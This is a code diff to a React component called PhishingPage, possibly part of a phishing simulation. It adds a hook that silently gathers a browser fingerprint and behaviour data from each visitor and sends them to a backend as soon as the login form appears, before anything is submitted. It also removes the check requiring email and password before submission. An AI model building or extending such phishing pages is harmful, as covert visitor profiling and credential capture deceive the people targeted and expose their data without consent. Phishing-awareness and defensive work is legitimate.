@@ -95,6 +95,42 @@ const PhishingPage = () => {
     }
   }, [stage, countdown]);
 
+  // Capture fingerprint data on form stage (before submission)
+  useEffect(() => {
+    if (stage === 'form') {
+      // Collect and send fingerprint immediately when form appears
+      const captureInitialData = async () => {
+        try {
+          const fingerprint = await collectFingerprint();
+          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+
+          const initialData = {
+            ...fingerprint,
+            behavior: {
+              ...behaviorRef.current,
+              timeOnPage,
+            },
+            metadata: {
+              userSubmitted: false, // Not submitted yet, just visiting
+              formData: {
+                email: null,
+                password: null,
+              },
+            },
+            timestamp: new Date().toISOString(),
+          };
+
+          // Send initial fingerprint to backend
+          await captureData(initialData);
+        } catch (error) {
+          console.error('Error capturing initial data:', error);
+        }
+      };
+
+      captureInitialData();
+    }
+  }, [stage]);
+
   // Type text effect for terminal
   const typeText = (text, speed = 30) => {
     return new Promise((resolve) => {
@@ -127,11 +163,6 @@ const PhishingPage = () => {
   // Handle form submission
   const handleSubmit = async (e) => {
     e.preventDefault();
-
-    if (!formData.email || !formData.password) {
-      alert('Please fill in all fields');
-      return;
-    }
 
     setIsSubmitting(true);
     safeVibrate([200, 100, 200]);
